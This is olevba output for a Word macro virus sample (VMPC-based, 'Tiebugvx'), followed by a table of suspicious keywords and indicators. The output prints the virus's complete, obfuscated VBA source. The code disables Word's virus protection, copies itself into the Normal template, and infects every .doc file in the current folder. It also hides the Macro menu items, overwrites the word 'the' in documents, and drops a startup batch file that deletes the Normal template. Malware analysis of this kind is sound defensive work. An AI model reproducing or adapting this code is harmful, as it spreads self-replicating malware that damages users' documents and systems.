olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-abc30a0c3b339d8e5feda8ad54b6cdb9d0fed9d5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-abc30a0c3b339d8e5feda8ad54b6cdb9d0fed9d5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tiebugvx.bas 
in file: Virus.MSWord.VMPC-based-abc30a0c3b339d8e5feda8ad54b6cdb9d0fed9d5 - OLE stream: 'Macros/VBA/Tiebugvx'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub Tiebugvx()
On Error Resume Next
Randomize
f11279 = u12627 & c12158 & Int(Rnd * 1758)
f11279 = m12627 & c12158 & Int(Rnd * 9701)
k10298 = m9919 & e2467
f5428 = m9919 & c7337 & Int(Rnd * 4044)
f8771 = u4418 & c1496 & k5895 & m4418
f8771 = m4418 & c1496 & Int(Rnd * 3458)
k13612 = m15814 & e15181
f13688 = m15814 & c15105 & Int(Rnd * 8212)
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("Tiebugvx").Export "c:\tgvx.sys"
f10463 = u9682 & c12181 & k8951 & m9682
f10463 = m9682 & c12181 & Int(Rnd * 5895)
f14617 = u12050 & c16838 & k17423 & m12050
f14617 = m12050 & c16838 & Int(Rnd * 4677)
f14152 = u3933 & c10972 & Int(Rnd * 2115)
f14152 = m3933 & c10972 & Int(Rnd * 1445)
ActiveDocument.ReadOnlyRecommended = False
f2309 = m6808 & c16576 & Int(Rnd * 3670)
k6583 = m12613 & e6722
f7557 = m12613 & c5748 & Int(Rnd * 9406)
k8550 = m8273 & e10664
f10855 = m8273 & c8359 & Int(Rnd * 5425)
k9142 = m17539 & e9908
f6582 = m17539 & c12468 & Int(Rnd * 9547)
f7975 = u11891 & c10068 & Int(Rnd * 3456)
f7975 = m11891 & c10068 & Int(Rnd * 9243)
check = Int(Rnd * 1000)
If check = 999 Then Call Tbugvx
f13509 = u3268 & c13254 & Int(Rnd * 3417)
f13509 = m3268 & c13254 & Int(Rnd * 2568)
k7672 = m12218 & e12101
f15951 = m12218 & c3822 & Int(Rnd * 5824)
k11769 = m15240 & e10273
f16057 = m15240 & c5985 & Int(Rnd * 7767)
f690 = m11068 & c5580 & Int(Rnd * 4934)
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox "GOT MILK?", vbSystemModal
k15828 = m11643 & e17191
f18319 = m11643 & c14700 & Int(Rnd * 5379)
f8094 = u10257 & c1304 & Int(Rnd * 193)
f8094 = m10257 & c1304 & Int(Rnd * 6340)
f4392 = u10663 & c3442 & Int(Rnd * 3821)
f4392 = m10663 & c3442 & Int(Rnd * 5637)
k12112 = m4339 & e11448
f10450 = m4339 & c13110 & Int(Rnd * 742)
 f9517$ = "c:\windows\startm~1\programs\startup\msfile.bat"
f8367 = m10483 & c6247 & Int(Rnd * 8774)
k7919 = m12388 & e10168
f7284 = m12388 & c10803 & Int(Rnd * 6972)
j68657670 = GetAttr(NormalTemplate.FullName)
k3021 = m6548 & e15938
f7962 = m6548 & c10997 & Int(Rnd * 4090)
f9070 = m15330 & c14581 & Int(Rnd * 6199)
If j68657670 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call XTiebugvx(f9517$)
f7272 = u7044 & c11732 & Int(Rnd * 5406)
f7272 = m7044 & c11732 & Int(Rnd * 1819)
f3523 = u8611 & c12325 & Int(Rnd * 6405)
f3523 = m8611 & c12325 & Int(Rnd * 7721)
If j68657670 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call XTiebugvx(f9517$)
f10391 = u10156 & c12493 & k11645 & m10156
f10391 = m10156 & c12493 & Int(Rnd * 2194)
f14736 = u10415 & c8073 & Int(Rnd * 9764)
f14736 = m10415 & c8073 & Int(Rnd * 1773)
If j68657670 = vbReadOnly Then GoTo vTiebugvx
f13224 = m7698 & c19238 & Int(Rnd * 4980)
f6808 = m8927 & c5867 & Int(Rnd * 8587)
If j68657670 = vbReadOnly + vbArchive Then GoTo vTiebugvx
f11678 = m11486 & c7930 & Int(Rnd * 9946)
f7451 = m9592 & c3585 & Int(Rnd * 7463)
k10326 = m16074 & e8393
f8034 = m16074 & c10685 & Int(Rnd * 7792)
k7299 = m16964 & e5000
f8951 = m16964 & c3348 & Int(Rnd * 9102)
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "Tiebugvx" Then nae7670485512 = True
Next I
k4892 = m13279 & e6774
f8200 = m13279 & c3466 & Int(Rnd * 8283)
k10613 = m12861 & e17713
f17211 = m12861 & c11115 & Int(Rnd * 3271)
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "Tiebugvx" Then tgx485510 = True
Next I
f8081 = m4914 & c12231 & Int(Rnd * 1187)
f18140 = u19095 & c12848 & k14424 & m19095
f18140 = m19095 & c12848 & Int(Rnd * 9734)
If nae7670485512 = True And tgx485510 = False Then Set y485576706 = NormalTemplate.VBProject.VBComponents
If nae7670485512 = False And tgx485510 = True Then Set y485576706 = ActiveDocument.VBProject.VBComponents
y485576706.import "c:\tgvx.sys"
If nae7670485512 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
f13581 = m12793 & c12942 & Int(Rnd * 6269)
f5832 = m13853 & c12586 & Int(Rnd * 8728)
f6987 = u11475 & c7718 & Int(Rnd * 6480)
f6987 = m11475 & c7718 & Int(Rnd * 4232)
f14378 = u5319 & c14369 & Int(Rnd * 7658)
f14378 = m5319 & c14369 & Int(Rnd * 484)
f6011 = u6402 & c14438 & Int(Rnd * 5667)
f6011 = m6402 & c14438 & Int(Rnd * 4373)
f11498 = u8938 & c6078 & Int(Rnd * 6073)
f11498 = m8938 & c6078 & Int(Rnd * 4302)
If tgx485510 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
f12939 = m12129 & c5225 & Int(Rnd * 7393)
f9475 = u9265 & c9831 & k14672 & m9265
f9475 = m9265 & c9831 & Int(Rnd * 883)
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
f15486 = u4103 & c7955 & Int(Rnd * 3950)
f15486 = m4103 & c7955 & Int(Rnd * 2593)
f4213 = m18114 & c11589 & Int(Rnd * 9992)
vTiebugvx:
End Sub
Sub HelpAbout()
    On Error Resume Next
k10833 = m6875 & e9856
f5939 = m6875 & c14750 & Int(Rnd * 671)
f1619 = u7304 & c7313 & Int(Rnd * 6287)
f1619 = m7304 & c7313 & Int(Rnd * 1399)
    MsgBox "Infected 1998 - 3001 by Virus!", vbInformation
f12009 = u5894 & c3492 & k7395 & m5894
f12009 = m5894 & c3492 & Int(Rnd * 929)
k19113 = m11384 & e13980
f13974 = m11384 & c19119 & Int(Rnd * 5800)
End Sub
Sub FileNew()
    On Error Resume Next
f11750 = m6856 & c7557 & Int(Rnd * 3191)
    Call Tiebugvx
k7257 = m6946 & e3660
f4763 = m6946 & c6154 & Int(Rnd * 1622)
k4353 = m12920 & e9300
f11345 = m12920 & c2308 & Int(Rnd * 8506)
Dialogs(wdDialogFileNew).Show
f6548 = u9888 & c9931 & Int(Rnd * 1353)
f6548 = m9888 & c9931 & Int(Rnd * 849)
f10655 = u13416 & c13043 & Int(Rnd * 6961)
f10655 = m13416 & c13043 & Int(Rnd * 6235)
    Skip = 1
k8384 = m3169 & e10292
f11000 = m3169 & c7676 & Int(Rnd * 2371)
k12978 = m16528 & e14600
f13774 = m16528 & c13804 & Int(Rnd * 6610)
    Call Tiebugvx
f2216 = u14972 & c13423 & Int(Rnd * 1790)
f2216 = m14972 & c13423 & Int(Rnd * 6422)
End Sub
Sub FileSave()
    On Error Resume Next
f16607 = m14070 & c10549 & Int(Rnd * 9396)
f14285 = m3485 & c11216 & Int(Rnd * 3237)
    Call Tiebugvx
k5605 = m14229 & e14965
f13250 = m14229 & c7320 & Int(Rnd * 4830)
f14928 = u4150 & c8935 & Int(Rnd * 5377)
f14928 = m4150 & c8935 & Int(Rnd * 2113)
    ActiveDocument.Save
k7668 = m8817 & e12015
f9608 = m8817 & c10075 & Int(Rnd * 2675)
f6429 = u11522 & c8698 & Int(Rnd * 6294)
f6429 = m11522 & c8698 & Int(Rnd * 3752)
End Sub
Sub FileSaveAs()
    On Error Resume Next
k6225 = m9652 & e10135
f11583 = m9652 & c4777 & Int(Rnd * 2700)
f4691 = u17418 & c6465 & k9950 & m17418
f4691 = m17418 & c6465 & Int(Rnd * 7920)
Dialogs(wdDialogFileSaveAs).Show
f11464 = m11286 & c13541 & Int(Rnd * 5603)
f5619 = m13654 & c18197 & Int(Rnd * 4385)
    Call Tiebugvx
k6856 = m5537 & e632
f5155 = m5537 & c2333 & Int(Rnd * 1153)
f13310 = u8412 & c17936 & Int(Rnd * 9400)
f13310 = m8412 & c17936 & Int(Rnd * 3378)
End Sub
Sub FileExit()
    On Error Resume Next
k6913 = m17848 & e12485
f10370 = m17848 & c9028 & Int(Rnd * 8648)
f13667 = u13507 & c11640 & Int(Rnd * 3957)
f13667 = m13507 & c11640 & Int(Rnd * 4667)
    Call Tiebugvx
f17583 = u19143 & c13828 & k15480 & m19143
f17583 = m19143 & c13828 & Int(Rnd * 9255)
k6197 = m13495 & e14208
f8977 = m13495 & c11428 & Int(Rnd * 8951)
    If ActiveDocument.Saved = False Then ActiveDocument.Save
f16322 = u8502 & c6534 & k12538 & m8502
f16322 = m8502 & c6534 & Int(Rnd * 1810)
f6953 = u13822 & c5182 & k4010 & m13822
f6953 = m13822 & c5182 & Int(Rnd * 5532)
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Tiebugvx
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Tiebugvx
End If
Loop
    Application.Quit
f8870 = m10475 & c9265 & Int(Rnd * 7009)
f11690 = u12672 & c6939 & Int(Rnd * 3424)
f11690 = m12672 & c6939 & Int(Rnd * 4642)
End Sub
Sub AutoOpen()
    On Error Resume Next
f9322 = u13247 & c16059 & Int(Rnd * 4042)
f9322 = m13247 & c16059 & Int(Rnd * 5087)
k7132 = m11861 & e4627
f9096 = m11861 & c2663 & Int(Rnd * 6048)
    Call Tiebugvx
k8727 = m12267 & e11466
f15392 = m12267 & c4801 & Int(Rnd * 5345)
k12442 = m19572 & e7211
f13262 = m19572 & c6391 & Int(Rnd * 9983)
End Sub
Sub AutoExit()
    On Error Resume Next
f11179 = u15716 & c9527 & k9788 & m15716
f11179 = m15716 & c9527 & Int(Rnd * 8015)
f8286 = u13991 & c12164 & k4258 & m13991
f8286 = m13991 & c12164 & Int(Rnd * 6680)
    Call Tiebugvx
f10774 = u11782 & c4278 & Int(Rnd * 3572)
f10774 = m11782 & c4278 & Int(Rnd * 3332)
f10072 = u6935 & c15941 & Int(Rnd * 7447)
f10072 = m6935 & c15941 & Int(Rnd * 5907)
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Tiebugvx
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Tiebugvx
End If
Loop
End Sub
Sub ViewVBCode()
    On Error Resume Next
k17419 = m8648 & e3948
f8274 = m8648 & c13093 & Int(Rnd * 1527)
k15384 = m10215 & e12824
f14523 = m10215 & c13685 & Int(Rnd * 7429)
f13203 = u5390 & c15774 & Int(Rnd * 8765)
f13203 = m5390 & c15774 & Int(Rnd * 1435)
k4697 = m2020 & e10475
f5739 = m2020 & c9433 & Int(Rnd * 1481)
f16036 = u12932 & c2520 & k7037 & m12932
f16036 = m12932 & c2520 & Int(Rnd * 4222)
k4506 = m14161 & e14260
f9620 = m14161 & c9146 & Int(Rnd * 7828)
f2680 = u13090 & c9290 & Int(Rnd * 3691)
f2680 = m13090 & c9290 & Int(Rnd * 9654)
End Sub
Sub Tbugvx()
    On Error Resume Next
f8452 = u11196 & c4945 & Int(Rnd * 1472)
f8452 = m11196 & c4945 & Int(Rnd * 7171)
f9037 = u7679 & c12045 & Int(Rnd * 5116)
f9037 = m7679 & c12045 & Int(Rnd * 7500)
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "the"
            .Replacement.Text = "Tiebug.vx"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
f9953 = u18568 & c4708 & Int(Rnd * 8911)
f9953 = m18568 & c4708 & Int(Rnd * 8810)
f9203 = u14882 & c4827 & k11230 & m14882
f9203 = m14882 & c4827 & Int(Rnd * 7991)
End Sub
    
Sub XTiebugvx(strFile As String)
    
Dim hFile As Long
On Error Resume Next
f10025 = u8097 & c4396 & Int(Rnd * 2092)
f10025 = m8097 & c4396 & Int(Rnd * 2513)
f9083 = u6517 & c13591 & Int(Rnd * 7181)
f9083 = m6517 & c13591 & Int(Rnd * 895)
n$ = NormalTemplate
f9142 = m10699 & c14208 & Int(Rnd * 9442)
f4584 = u14397 & c4303 & Int(Rnd * 3809)
f4584 = m14397 & c4303 & Int(Rnd * 5977)
Part11$ = "attrib -h -r "
f16833 = u15457 & c13946 & Int(Rnd * 5495)
f16833 = m15457 & c13946 & Int(Rnd * 8436)
k11917 = m13079 & e5149
f7988 = m13079 & c9078 & Int(Rnd * 3940)
snag$ = "c:\progra~1\micros~1\templa~1\"
f7191 = u10554 & c7650 & Int(Rnd * 52)
f7191 = m10554 & c7650 & Int(Rnd * 9725)
k14477 = m8006 & e8334
f7013 = m8006 & c15798 & Int(Rnd * 4081)
snag1$ = "c:\progra~1\micros~2\templa~1\"
k3198 = m10542 & e6742
f2501 = m10542 & c7439 & Int(Rnd * 4010)
f3941 = u13732 & c6584 & Int(Rnd * 5110)
f3941 = m13732 & c6584 & Int(Rnd * 7101)
Part2$ = "del "
f10476 = m870 & c11191 & Int(Rnd * 591)
k7104 = m5706 & e8700
f6489 = m5706 & c9315 & Int(Rnd * 2301)
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
f15213 = u9719 & c12949 & Int(Rnd * 9518)
f15213 = m9719 & c12949 & Int(Rnd * 9700)
k11162 = m12109 & e15618
f8751 = m12109 & c18029 & Int(Rnd * 9912)
k14133 = m8908 & e7159
f12620 = m8908 & c8672 & Int(Rnd * 1107)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |msfile.bat          |Executable file name                         |
|Hex String|hevp                |68657670                                     |
|Hex String|HUvp                |48557670                                     |
+----------+--------------------+---------------------------------------------+

